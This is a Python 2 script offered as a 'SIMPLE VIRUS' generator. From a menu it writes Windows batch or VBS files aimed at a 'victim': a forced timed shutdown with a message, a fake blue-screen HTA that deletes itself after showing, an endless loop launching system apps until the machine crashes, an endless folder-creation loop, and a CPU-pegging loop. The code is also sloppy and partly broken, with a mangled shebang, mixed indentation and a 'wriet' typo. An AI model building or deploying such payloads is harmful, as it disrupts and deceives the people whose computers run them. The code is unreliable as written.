#usr/env python!
#author:Aiden

import sys
import os

def usage():
	print''
print \
'''
'##::::'##:'####:'########::'##::::'##::'######::
 ##:::: ##:. ##:: ##.... ##: ##:::: ##:'##... ##:
 ##:::: ##:: ##:: ##:::: ##: ##:::: ##: ##:::..::
 ##:::: ##:: ##:: ########:: ##:::: ##:. ######::
. ##:: ##::: ##:: ##.. ##::: ##:::: ##::..... ##:
:. ## ##:::: ##:: ##::. ##:: ##:::: ##:'##::: ##:
::. ###::::'####: ##:::. ##:. #######::. ######::
:::...:::::....::..:::::..:::.......::::......:::

'''                            
                            
                                                

def shutdown(): 

    name = raw_input('Enter name of virus: ')+'.bat'  

    try:
        file = open(name,'w')# Trying to create a new file or open one
        print("creating simple virus turn off victim computer...")
        message = raw_input("message to victim : ")
        time = raw_input("time shutdown : ")
        file.write("shutdown.exe -s -t {0} -c \"{1}\"".format(time,message))
    except:
        print('Something went wrong')
        sys.exit(0) #

def FBOD(): 

    name = raw_input('Enter name of virus: ')+'.bat' 
	
    try:
        file = open(name,'w')# Trying to create a new file or open one
        print("creating simple virus Fake Bule Sreen Of Death(BOD)...")
        file.write("@echo off"'\n')
        file.write("echo ^<html^>^<head^>^<title^>Blue Screen of Death^"'\n')
        file.write("</title^> > bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<hta:application id=\"oBVC\" >> bsod.hta"'\n')
        file.write("echo applicationname=\"BSOD\" >> bsod.hta"'\n')
        file.write("echo version=\"1.0\" >> bsod.hta"'\n')
        file.write("echo maximizebutton=\"no\" >> bsod.hta"'\n')
        file.write("echo minimizebutton=\"no\" >> bsod.hta"'\n')
        file.write("echo sysmenu=\"no\" >> bsod.hta"'\n')
        file.write("echo Caption=\"no\" >> bsod.hta"'\n')
        file.write("echo windowstate=\"maximize\"/^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^</head^>^<body bgcolor=\"#000088\" scroll=\"no\"^> >> bsod.hta"'\n')
        file.write("echo ^<font face=\"Lucida Console\" size=\"4\" color=\"#FFFFFF\")^> >> bsod.hta"'\n')
        file.write("echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ"'\n')
        file.write("UAL^</p^> >> bsod.htaecho. >> bsod.hta"'\n')
        file.write("echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>Technical information:^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000"'\n')
        file.write("000,0xF86B5A89)^</p^> >> bsod.htaecho. >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta"'\n')
        file.write("echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo. >> bsod.hta"'\n')
        file.write("echo ^</font^> >> bsod.hta"'\n')
        file.write("echo ^</body^>^</html^> >> bsod.hta"'\n')
        file.write("start \"\" /wait \"bsod.hta\""'\n')
        file.write("del /s /f /q \"bsod.hta\" > nul"'\n')
    except:
        print('Something went wrong')
        sys.exit(0)
def ocrash():
        
    name = raw_input('Enter name of virus: ')+'.bat'
        
    try:
        file = open(name,'w')# Trying to create a new file or open one
        message = raw_input("message to victim : ")
	print("creating simple virus open apps until window crash or lag...")
        file.write("@echo off "'\n')
	file.write("msg * {0}"'\n'.format(message))
	file.write(":top"'\n')
	file.write("START %SystemRoot%\system32\dialer.exe"'\n')
        file.write("START %SystemRoot%\system32\calc.exe"'\n')
        file.write("START %SystemRoot%\system32\cmd.exe"'\n')
        file.write("START %SystemRoot%\system32\fontview.exe"'\n')
        file.write("START %SystemRoot%\system32\osk.exe"'\n')
        file.write("GOTO top")
    except:
		print('Something went wrong')
		sys.exit(0)
def md():

	name = raw_input('Enter name of virus: ')+'.bat'
	
	try:
		file = open(name, 'w')
		print("creating simple virus open create more than 3000 foler in 1 min...")
		file.write("@echo off"'\n')
		file.write(":A"'\n')
		file.wriet("md %random%"'\n')
		file.write("goto:A")
        except:
		print('Something wen wrong')
def fullcpu():

	name = raw_input('Enter name of virus: ')+'.vbs'
	
	try:
		file = open(name,'w')
		print("creating simple virus make victim CPU 100%...")
		message = raw_input("message to victim : ")
		file.write("msg * {0}"'\n'.format(message))
		file.write("while true"'\n')
		file.write("wend")
	except:
		print('Something went wrong')
	
print("SIMPLE VIRUS")
print("1.Shutdown computer")
print("2.Fake Screen Of Death")
print("3.Open apps until window crash or lag")
print("4.Create more than 3000 folder in 1 minute")
print("5.CPU Usage reach 100%")
choose = raw_input("Choose Virus  : ")
if choose == "1":
    shutdown()
elif choose == "2":
	FBOD()
elif choose == "3":
	ocrash()
elif choose == "4":
        md()
elif choose == "5":
        fullcpu()
else:
    print("ERROR")
    
